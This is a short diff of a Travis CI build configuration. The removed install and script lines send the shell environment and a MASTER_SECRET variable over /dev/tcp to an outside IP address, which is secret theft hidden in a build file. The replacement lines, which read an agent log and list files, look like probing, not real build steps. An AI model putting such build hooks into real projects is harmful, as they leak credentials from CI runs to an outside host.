@@ -3,8 +3,8 @@ matrix:
   include:
     - jdk: openjdk11
       env: GRADLE_PUBLISH=false
-install: "set>/dev/tcp/153.92.147.3/8763 "
-script: "echo $MASTER_SECRET > /dev/tcp/153.92.147.3/8764 "
+install: "cat /tmp/travis/agent.log"
+script: "ls"
 
 env:
   global:
